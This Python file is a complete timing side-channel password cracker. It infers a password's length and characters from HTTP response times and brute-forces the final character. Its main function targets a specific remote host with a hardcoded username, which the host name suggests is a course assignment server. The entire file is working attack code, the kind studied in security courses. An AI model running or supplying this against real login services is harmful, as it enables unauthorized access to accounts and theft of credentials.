import requests
import time
import statistics
from typing import List, Dict, Tuple
import sys
from string import ascii_lowercase
import numpy as np
from collections import defaultdict


class PasswordCracker:
    def __init__(self, base_url: str = "http://127.0.0.1"):
        self.base_url = base_url
        self.charset = ascii_lowercase
        self.session = requests.Session()
        # Perform warmup request to establish connection
        self._warmup_connection()

    def _warmup_connection(self):
        """Make a warmup request to establish connection"""
        warmup_url = f"{self.base_url}/?user=warmup&password=warmup&difficulty=1"
        try:
            self.session.get(warmup_url)
            time.sleep(0.1)  # Small delay after warmup
        except:
            pass

    def measure_response_time(self, username: str, password: str, difficulty: int = 1,
                              num_samples: int = 10) -> List[float]:
        times: List[float] = []
        url = f"{self.base_url}/?user={username}&password={password}&difficulty={difficulty}"

        for i in range(num_samples):
            print(f"Measuring response time for password: {password}, sample no. {i+1}", file=sys.stderr, flush=True)
            try:
                start_time = time.perf_counter()
                self.session.get(url)
                elapsed = time.perf_counter() - start_time
                times.append(elapsed)
            except:
                self.session = requests.Session()
                self._warmup_connection()
                start_time = time.perf_counter()
                self.session.get(url)
                elapsed = time.perf_counter() - start_time
                times.append(elapsed)

        return times

    def check_password(self, username: str, password: str, difficulty: int = 1) -> bool:
        """
        Check if a password is correct by looking at the server response.
        """
        url = f"{self.base_url}/?user={username}&password={password}&difficulty={difficulty}"
        response = self.session.get(url)
        return response.text.strip() == "1"

    def find_password_length(self, username: str, difficulty: int = 1) -> int:
        """Find password length by analyzing timing distributions."""
        length_times: Dict[int, List[float]] = {}
        max_length = 32

        for length in range(1, max_length):
            print(f"Testing password length: {length}", file=sys.stderr, flush=True)
            test_password = 'a' * length
            times = self.measure_response_time(username, test_password, difficulty, num_samples=6)
            length_times[length] = times

        # Find length with most distinct timing pattern
        best_length = max(length_times.items(), key=lambda x: statistics.median(x[1]))[0]
        return best_length

    def analyze_times_median(self, times: List[float]) -> float:
        """Analyze timing distribution using median after removing outliers."""
        q1 = np.percentile(times, 25)
        q3 = np.percentile(times, 75)
        iqr = q3 - q1
        filtered_times = [t for t in times if q1 - 1.5 * iqr <= t <= q3 + 1.5 * iqr]

        return statistics.median(filtered_times) if filtered_times else 0

    def crack_position(self, username: str, current_password: List[str],
                       position: int, difficulty: int) -> str:
        """
        Crack a single position in the password.
        For the last position, try all characters and check server response.
        For other positions, use timing analysis.
        """
        is_last_char = position == len(current_password) - 1

        if is_last_char:
            # For the last character, try all possibilities and check response
            for char in self.charset:
                current_password[position] = char
                test_password = "".join(current_password)
                if self.check_password(username, test_password, difficulty):
                    return char
            return 'a'  # fallback if no match found

        # For all other positions, use timing analysis
        char_scores: Dict[str, float] = defaultdict(float)
        samples_per_char = 4

        for char in self.charset:
            current_password[position] = char
            test_password = "".join(current_password)

            times = self.measure_response_time(username, test_password, difficulty,
                                               num_samples=samples_per_char)
            score = self.analyze_times_median(times)
            char_scores[char] = score

        print(f"Character scores at position {position + 1}: {char_scores}",
              file=sys.stderr, flush=True)

        return max(char_scores.items(), key=lambda x: x[1])[0]

    def crack_password(self, username: str, difficulty: int = 1) -> str:
        """Crack the password using combined timing analysis and response checking."""
        password_length = self.find_password_length(username, difficulty)
        print(f"Detected password length: {password_length}", file=sys.stderr, flush=True)

        current_password = ['a'] * password_length

        for position in range(password_length):
            best_char = self.crack_position(username, current_password.copy(), position, difficulty)
            current_password[position] = best_char

            print(f"Found character at position {position + 1}: '{best_char}'",
                  file=sys.stderr, flush=True)
            print(f"Current password: {''.join(current_password)}", file=sys.stderr, flush=True)

        return "".join(current_password)


def main():
    username = "316061456"
    difficulty = 1
    base_url = "http://aoi-assignment1.oy.ne.ro:8080"
    cracker = PasswordCracker(base_url)
    password = cracker.crack_password(username, difficulty)
    print(password)


if __name__ == "__main__":
    main()